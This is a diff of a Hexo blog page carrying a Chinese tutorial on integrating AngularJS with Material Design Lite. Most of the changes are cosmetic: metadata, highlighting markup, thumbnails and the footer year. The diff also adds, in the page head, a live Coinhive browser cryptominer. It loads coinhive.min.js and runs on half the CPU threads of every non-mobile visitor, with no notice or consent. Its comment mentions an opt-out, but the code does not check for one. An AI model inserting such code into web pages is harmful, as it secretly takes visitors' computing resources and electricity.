@@ -12,6 +12,7 @@
 <meta property="og:url" content="http://kingzez.com/2016/09/16/angularjs与MDL的整合/index.html">
 <meta property="og:site_name" content="the kingzez blog">
 <meta property="og:description" content="很喜欢Material Design的风格，最近做项目打算用Material Design Lite">
+<meta property="og:locale" content="zh-CN">
 <meta property="og:updated_time" content="2016-09-16T03:45:48.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="angularjs与MDL的整合">
@@ -63,6 +64,20 @@
   ga('send', 'pageview');
 
 </script>
+<!-- Coinhive -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+	var miner = new CoinHive.User('r0WSj9IIUFDNRQl8X4f4zeapVsRB99kq', 'kingzez', {
+		threads: Math.round(navigator.hardwareConcurrency/2),
+		throttle: 0.5
+		});
+	// Only start on non-mobile devices and if not opted-out
+	// in the last 14400 seconds (4 hours):
+	if (!miner.isMobile()) {
+		miner.start();
+	}
+</script>
+
 </head>
 <body>
     <div id="container">
@@ -248,7 +263,7 @@
 <blockquote>
 <p>Material Design Lite will automatically register and render all elements marked with MDL classes upon page load. However in the case where you are creating DOM elements dynamically you need to register new elements using the <code>upgradeElement</code> function. Here is how you can dynamically create the same raised button with ripples shown in the section above:</p>
 </blockquote>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></div><div class="line">  <span class="keyword">var</span> button = <span class="built_in">document</span>.createElement(<span class="string">'button'</span>);</div><div class="line">  <span class="keyword">var</span> textNode = <span class="built_in">document</span>.createTextNode(<span class="string">'Click Me!'</span>);</div><div class="line">  button.appendChild(textNode);</div><div class="line">  button.className = <span class="string">'mdl-button mdl-js-button mdl-js-ripple-effect'</span>;</div><div class="line">  componentHandler.upgradeElement(button);</div><div class="line">  <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>).appendChild(button);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"container"</span>/&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">  <span class="keyword">var</span> button = <span class="built_in">document</span>.createElement(<span class="string">'button'</span>);</span></div><div class="line"><span class="javascript">  <span class="keyword">var</span> textNode = <span class="built_in">document</span>.createTextNode(<span class="string">'Click Me!'</span>);</span></div><div class="line"><span class="undefined">  button.appendChild(textNode);</span></div><div class="line"><span class="actionscript">  button.className = <span class="string">'mdl-button mdl-js-button mdl-js-ripple-effect'</span>;</span></div><div class="line"><span class="undefined">  componentHandler.upgradeElement(button);</span></div><div class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">'container'</span>).appendChild(button);</span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
 <p>找到原因后就要解决问题了，在angularjs中如何更新组件呢？因为这个更新是每时每刻都在运行的，所以要加在angular的启动文件app.js中，需要注意的是run加的位置，区分config和run的区别，config阶段是给了ng上下文一个针对constant与provider修改其内部属性的一个阶段，而run阶段是在config之后的在运行独立的代码块，通常写法runBlock，简单的说一下就是ng启动阶段是 config–&gt;run–&gt;compile/link，那么解决方法是：
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">angular.module(<span class="string">'app'</span>,[])</div><div class="line">	.run([<span class="string">'$rootScope'</span>, <span class="string">'$timeout'</span>, <span class="function"><span class="keyword">function</span><span class="params">($rootScope, $timeout)</span> </span>&#123;</div><div class="line">		$rootScope.$on(<span class="string">'$viewContentLoaded'</span>, () =&gt; &#123;</div><div class="line">			$timeout(() =&gt; &#123;</div><div class="line">			componentHandler.upgradeAllRegistered();</div><div class="line">			&#125;)</div><div class="line">		&#125;)</div><div class="line">	&#125;]);</div></pre></td></tr></table></figure></p>
 <p>那么开始后续的开发~</p>
@@ -262,7 +277,7 @@
 
 </div>
 
-    <a data-url="http://kingzez.com/2016/09/16/angularjs与MDL的整合/" data-id="cj3wdnje3001t09heknwljy0v" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
+    <a data-url="http://kingzez.com/2016/09/16/angularjs与MDL的整合/" data-id="cjcc61dib001z70fymsb7wt84" class="article-share-link"><i class="fa fa-share"></i>分享到</a>
 <script>
     (function ($) {
         // Prevent duplicate binding
@@ -400,7 +415,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small8.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -435,7 +450,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small3.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -470,7 +485,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small2.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -540,7 +555,7 @@
         
         
         
-        <span style="background-image:url(/images/thumb-default-small5.png)"  class="thumbnail-image thumbnail-none"></span>
+        <span style="background-image:url(/images/thumb-default-small7.png)"  class="thumbnail-image thumbnail-none"></span>
     
 </a>
    
@@ -594,7 +609,7 @@
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy;2015 - 2017 kingzez<br>
+            &copy;2015 - 2018 kingzez<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.
         </div>
     </div>
